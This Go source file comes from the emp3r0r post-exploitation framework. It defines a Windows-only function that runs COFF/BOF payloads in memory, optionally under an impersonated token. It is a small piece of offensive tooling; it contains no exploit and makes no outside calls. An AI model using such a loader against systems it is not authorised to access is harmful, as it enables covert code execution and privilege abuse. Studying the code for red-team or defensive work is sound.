//go:build windows

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
)

// runCOFFModule executes a COFF/BOF payload using goffloader on Windows.
// If token is non-zero, the BOF entry point runs under impersonation.
func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("runCOFFModule panic: %v", r)
			out = ""
		}
	}()

	if invocation.Coff == nil {
		return "", fmt.Errorf("missing COFF invocation data")
	}

	args := make([]coffloader.CoffArg, 0, len(invocation.Coff.Args))
	for _, a := range invocation.Coff.Args {
		args = append(args, coffloader.CoffArg{WireType: a.WireType, Value: a.Value})
	}

	return coffloader.RunWindowsCOFF(payload, invocation.Coff.Export, args, token)
}
